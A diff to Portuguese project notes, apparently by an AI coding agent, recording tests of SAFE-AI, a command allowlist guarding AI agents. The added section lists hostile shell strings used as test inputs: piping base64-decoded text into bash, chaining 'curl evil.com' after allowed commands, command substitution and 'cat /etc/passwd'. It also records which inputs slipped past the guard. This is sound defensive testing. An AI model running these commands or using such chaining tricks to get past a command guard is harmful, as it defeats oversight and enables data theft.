@@ -6,10 +6,30 @@ Repos locais: `karen` (branch `feat/fase0`; branch estacionada
 (master), e `PAI` (clone novo de `lucasmulato/PurpleAgenticInteligence`, main,
 HEAD `13dbf2c`).
 
-## SAFE-AI e LLM-SEC
-**Não inspecionados.** Não há repos locais nem URLs fornecidas. O teste
-`docker compose up` e os bypasses de `/execute` e `/audit` da Fase 0 não
-puderam ser executados. Nenhum resultado foi inventado.
+## SAFE-AI (inspecionado em 2026-11-24)
+Repos clonados: `SAFE-AI` (`main`, `3351824`) e `LLM-SEC` (`master`, `db165a3`).
+Docker não está instalado; equivalente usado: uvicorn local com
+`ALLOWLIST_PATH=config/allowlist.yaml` e `AUDIT_DB_PATH=data/audit.db`,
+venv em `/tmp/opencode/safeai-venv`.
+
+- `/execute` com os 3 exemplos do README: PERMIT (`ls -la`), REJECT
+  (`curl http://site-malicioso.com`), ASK_HUMAN (`rm -rf /tmp/cache`). `/audit`
+  devolveu 3 registros. OK.
+- Bypasses que passaram indevidamente como PERMIT (só o primeiro token é
+  avaliado): `echo ... | base64 -d | bash`; `ls -la; curl evil.com`;
+  `ls -la && curl evil.com`; `echo $(curl evil.com)`.
+- Rejeitados corretamente: `sh -c "curl evil.com"`, `/bin/curl`, `alias c=curl; ...`,
+  `$(curl evil.com)`, `python -c ...`, `CURL`, `bash -i`.
+- `cat /etc/passwd` é PERMIT porque `cat` está na permit list — limitação de
+  política, não bypass de parser.
+- LLM-SEC: manter redação exata — CONF-2 (Reproducible) overall; CONF-3
+  (Bounded Model Checking) for core protocol, TLC depth 10, 172.020 estados.
+  Não aumentar o claim.
+
+## Lacunas resolvidas / restantes
+Resolvidas: URLs e clones de SAFE-AI/LLM-SEC, execução dos 3 exemplos e dos
+testes de bypass. Restantes: confirmar "AI Safety Residency 2026"/"Private R&D";
+definir escopo do suporte Climara; vídeo/GIF do demo; Lighthouse; EN do site.
 
 ## PAI — o que roda
 - `python3 core/orchestrator.py` roda e imprime o loop Red → Blue → Guardian →
@@ -52,7 +72,3 @@ puderam ser executados. Nenhum resultado foi inventado.
 - Site público segue **sem preço publicado**; publicar é Tier 2 (EQ-006).
 - Contato/WhatsApp para o site: +5511988869469 (número pessoal do Lucas,
   provisório).
-
-## Lacunas
-URLs de SAFE-AI/LLM-SEC; vídeo/GIF do demo; vídeos PT/EN; teste Lighthouse;
-confirmação de residency/private R&D; escopo do suporte; deploy.
